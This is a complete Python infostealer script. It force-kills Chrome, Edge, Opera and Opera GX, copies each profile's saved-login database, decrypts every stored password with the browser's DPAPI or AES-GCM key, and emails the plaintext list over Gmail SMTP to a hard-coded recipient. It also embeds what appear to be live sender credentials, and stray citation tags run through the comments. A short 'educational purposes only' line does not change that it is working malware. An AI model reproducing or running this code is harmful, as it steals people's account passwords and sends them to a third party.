#!/usr/bin/env python3
"""
Combined Chrome, Edge, Opera & Opera GX Password Extractor with Auto-Close and Email Delivery
Extracts saved login credentials from all four browsers, then emails the results.
"""

import os
import sys
import sqlite3
import json
import base64
import shutil
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from pathlib import Path
from datetime import datetime

try:
    import win32crypt
except ImportError:
    print("[!] pywin32 not installed. Run: pip install pywin32")
    sys.exit(1)

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("[!] cryptography not installed. Run: pip install cryptography")
    sys.exit(1)


# ==================== EMAIL CONFIGURATION ====================
# YOU MUST UPDATE THESE WITH YOUR OWN EMAIL SETTINGS
EMAIL_CONFIG = {
    "smtp_server": "smtp.gmail.com",      # For Gmail. Change for other providers
    "smtp_port": 587,                      # 587 for TLS, 465 for SSL
    "sender_email": "notaemailspammer582@gmail.com",  # REPLACE WITH YOUR EMAIL
    "sender_password": "lssr jkze iecd nvho",         # REPLACE WITH APP PASSWORD
    "recipient_email": "detlaffcameron@gmail.com",    # REPLACE WITH RECIPIENT EMAIL
    "use_tls": True
}
# =============================================================


# Browser configuration – now includes Opera and Opera GX
BROWSERS = {
    "Chrome": {
        "user_data": Path(os.environ.get('LOCALAPPDATA', '')) / "Google" / "Chrome" / "User Data",
        "process_name": "chrome.exe"
    },
    "Edge": {
        "user_data": Path(os.environ.get('LOCALAPPDATA', '')) / "Microsoft" / "Edge" / "User Data",
        "process_name": "msedge.exe"
    },
    "Opera": {
        "user_data": Path(os.environ.get('APPDATA', '')) / "Opera Software" / "Opera Stable",
        "process_name": "opera.exe"
    },
    "Opera GX": {
        "user_data": Path(os.environ.get('APPDATA', '')) / "Opera Software" / "Opera GX Stable",
        "process_name": "opera.exe"
    }
}


def close_browsers():
    """
    Force close all configured browsers using taskkill [citation:4][citation:10]
    """
    print("[*] Attempting to close browsers...")
    
    for browser_name, config in BROWSERS.items():
        process_name = config["process_name"]
        try:
            # Use taskkill to force close the browser [citation:1][citation:4]
            result = os.system(f"taskkill /im {process_name} /f >nul 2>&1")
            if result == 0:
                print(f"    [✓] {browser_name} closed successfully")
            else:
                print(f"    [i] {browser_name} was not running")
        except Exception as e:
            print(f"    [!] Error closing {browser_name}: {e}")
    
    # Brief pause to ensure files are released
    import time
    time.sleep(1)


def get_encryption_key(local_state_path):
    """
    Retrieve and decrypt the AES key from the browser's Local State file.
    Returns the raw key bytes, or None if the old DPAPI method should be used.
    """
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get('os_crypt', {}).get('encrypted_key')
        if not encrypted_key_b64:
            return None   # Old Chrome/Edge/Opera version (no AES key)
        encrypted_key = base64.b64decode(encrypted_key_b64)
        # Remove the 'DPAPI' prefix (first 5 bytes) if present
        if encrypted_key[:5] == b'DPAPI':
            encrypted_key = encrypted_key[5:]
        # Decrypt using DPAPI
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"[!] Failed to retrieve encryption key from {local_state_path}: {e}")
        return None


def decrypt_aes_gcm(ciphertext, key):
    """
    Decrypt a Chrome/Edge/Opera v80+ password blob.
    Format: b'v10' (3 bytes) + nonce (12 bytes) + actual ciphertext (including 16-byte tag)
    """
    try:
        # Skip the 'v10' prefix (3 bytes)
        nonce = ciphertext[3:15]
        actual_ciphertext = ciphertext[15:]
        aesgcm = AESGCM(key)
        plaintext = aesgcm.decrypt(nonce, actual_ciphertext, None)
        return plaintext.decode('utf-8')
    except Exception as e:
        return f"[decryption error: {e}]"


def decrypt_old_dpapi(encrypted_blob):
    """Decrypt a password using DPAPI (pre-Chrome 80 / pre-Edge 80 / pre-Opera 80)."""
    try:
        return win32crypt.CryptUnprotectData(encrypted_blob, None, None, None, 0)[1].decode('utf-8')
    except Exception as e:
        return f"[decryption error: {e}]"


def process_login_data(login_data_path, key):
    """
    Open a Login Data SQLite database, extract saved credentials, and decrypt passwords.
    Returns a list of (url, username, password) tuples.
    """
    # Copy file because the browser may lock it
    temp_dir = tempfile.gettempdir()
    temp_db = os.path.join(temp_dir, 'browser_login_copy.db')
    try:
        shutil.copy2(login_data_path, temp_db)
    except Exception as e:
        print(f"[!] Could not copy Login Data file {login_data_path}: {e}")
        return []

    conn = None
    results = []
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0] or ''
            username = row[1] or ''
            encrypted_password = row[2]

            if not encrypted_password:
                password = ''
            else:
                if key:
                    # New AES encryption
                    password = decrypt_aes_gcm(encrypted_password, key)
                else:
                    # Old DPAPI encryption
                    password = decrypt_old_dpapi(encrypted_password)

            results.append((url, username, password))
    except sqlite3.Error as e:
        print(f"[!] SQLite error in {login_data_path}: {e}")
    finally:
        if conn:
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    return results


def get_login_data_files(browser_user_data):
    """Find all Login Data files under a browser's User Data folder."""
    login_data_files = []
    if not browser_user_data.exists():
        return login_data_files

    for profile_dir in browser_user_data.glob("*"):
        if profile_dir.is_dir():
            login_data_candidate = profile_dir / "Login Data"
            if login_data_candidate.exists():
                login_data_files.append(login_data_candidate)
    return login_data_files


def format_results_as_text(all_credentials):
    """Format the extracted credentials as a readable text report."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    lines = []
    lines.append("=" * 80)
    lines.append("CHROME, EDGE, OPERA & OPERA GX PASSWORD EXTRACTION REPORT")
    lines.append(f"Generated: {timestamp}")
    lines.append("=" * 80)
    lines.append("")
    
    if not all_credentials:
        lines.append("No credentials found in any of the browsers.")
        return "\n".join(lines)
    
    # Group by browser
    by_browser = {}
    for browser, profile, url, user, pwd in all_credentials:
        if browser not in by_browser:
            by_browser[browser] = []
        by_browser[browser].append((profile, url, user, pwd))
    
    for browser in sorted(by_browser.keys()):
        lines.append(f"\n{'=' * 40}")
        lines.append(f"BROWSER: {browser}")
        lines.append(f"{'=' * 40}")
        
        # Group by profile within browser
        by_profile = {}
        for profile, url, user, pwd in by_browser[browser]:
            if profile not in by_profile:
                by_profile[profile] = []
            by_profile[profile].append((url, user, pwd))
        
        for profile in sorted(by_profile.keys()):
            lines.append(f"\n--- Profile: {profile} ---")
            lines.append(f"{'URL':<50} {'Username':<30} {'Password':<30}")
            lines.append("-" * 110)
            
            for url, user, pwd in by_profile[profile]:
                if url or user or pwd:  # Only show non-empty entries
                    lines.append(f"{url[:50]:<50} {user[:30]:<30} {pwd[:30]:<30}")
    
    return "\n".join(lines)


def send_email(results_text):
    """
    Send the results via email using SMTP [citation:2][citation:5][citation:8]
    """
    print("\n[*] Preparing to send email...")
    
    # Validate configuration
    if EMAIL_CONFIG["sender_email"] == "your-email@gmail.com":
        print("[!] ERROR: Please update the EMAIL_CONFIG section with your actual email credentials")
        print("    - For Gmail, you need to create an App Password:")
        print("    - Go to https://myaccount.google.com/apppasswords")
        print("    - Generate a new app password and use it here")
        return False
    
    try:
        # Create message container [citation:2]
        msg = MIMEMultipart()
        msg['From'] = EMAIL_CONFIG["sender_email"]
        msg['To'] = EMAIL_CONFIG["recipient_email"]
        msg['Subject'] = f"Browser Password Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        
        # Add body text [citation:5]
        body = f"""
Browser Password Extraction Complete

This report contains saved passwords from Chrome, Edge, Opera and Opera GX.
Please handle this information securely and delete after use.

Report generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

---
Note: This tool is for educational purposes only. Only use on systems you own.
"""
        msg.attach(MIMEText(body, 'plain'))
        
        # Attach the results as a text file [citation:2][citation:8]
        attachment = MIMEApplication(results_text.encode('utf-8'), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', 
                              filename=f"browser_passwords_{datetime.now().strftime('%Y%m%d_%H%M')}.txt")
        msg.attach(attachment)
        
        # Connect to SMTP server and send [citation:5]
        print(f"    Connecting to {EMAIL_CONFIG['smtp_server']}:{EMAIL_CONFIG['smtp_port']}...")
        
        if EMAIL_CONFIG["use_tls"]:
            server = smtplib.SMTP(EMAIL_CONFIG["smtp_server"], EMAIL_CONFIG["smtp_port"])
            server.starttls()  # Upgrade to secure connection [citation:5]
        else:
            server = smtplib.SMTP_SSL(EMAIL_CONFIG["smtp_server"], EMAIL_CONFIG["smtp_port"])
        
        server.login(EMAIL_CONFIG["sender_email"], EMAIL_CONFIG["sender_password"])
        server.send_message(msg)
        server.quit()
        
        print(f"    [✓] Email sent successfully to {EMAIL_CONFIG['recipient_email']}")
        return True
        
    except Exception as e:
        print(f"[!] Failed to send email: {e}")
        print("\n[Troubleshooting Tips]")
        print("1. For Gmail, use an App Password (not your regular password)")
        print("2. Enable 'Less secure app access' or 2FA with App Password")
        print("3. Check that your SMTP settings are correct")
        return False


def main():
    print("[*] Combined Chrome, Edge, Opera & Opera GX Password Extractor with Auto-Close and Email")
    print("[*] " + "=" * 70)
    
    # Step 1: Close browsers to unlock database files [citation:4][citation:10]
    close_browsers()
    
    # Step 2: Extract passwords
    print("\n[*] Extracting passwords...")
    all_credentials = []  # (browser, profile, url, username, password)
    
    for browser_name, paths in BROWSERS.items():
        user_data = paths["user_data"]
        print(f"\n[*] Checking {browser_name}...")
        if not user_data.exists():
            print(f"    User Data folder not found: {user_data}")
            continue
        
        local_state = user_data / "Local State"
        if not local_state.exists():
            print(f"    Local State file not found, skipping {browser_name}.")
            continue
        
        key = get_encryption_key(local_state)
        if key:
            print(f"    Using AES-256-GCM decryption (new version).")
        else:
            print(f"    No AES key found – falling back to DPAPI (old version).")
        
        login_data_files = get_login_data_files(user_data)
        if not login_data_files:
            print(f"    No Login Data files found.")
            continue
        
        for login_data in login_data_files:
            profile_name = login_data.parent.name
            print(f"    Processing profile: {profile_name}")
            creds = process_login_data(login_data, key)
            for url, user, pwd in creds:
                if url and user and pwd:  # Only include entries with all fields
                    all_credentials.append((browser_name, profile_name, url, user, pwd))
    
    # Step 3: Format results
    print(f"\n[*] Found {len(all_credentials)} saved credentials total")
    results_text = format_results_as_text(all_credentials)
    
    # Step 4: Send via email
    send_email(results_text)
    
    # Step 5: Also display to console
    print("\n" + results_text)
    
    print("\n[*] Script completed.")


if __name__ == "__main__":
    main()